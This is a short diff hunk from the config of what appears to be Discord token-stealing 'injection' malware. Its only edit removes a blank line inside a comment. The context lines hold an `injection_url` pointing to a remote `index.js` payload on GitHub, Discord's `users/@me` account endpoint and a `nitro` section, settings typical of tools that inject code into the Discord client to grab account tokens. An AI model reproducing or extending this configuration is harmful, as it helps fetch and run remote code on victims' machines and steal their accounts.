@@ -16,7 +16,6 @@ const config = {
   embed_color: 8363488,
   injection_url: 'https://raw.githubusercontent.com/PrimeInj/Injection/main/index.js',
   /**
-
    **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
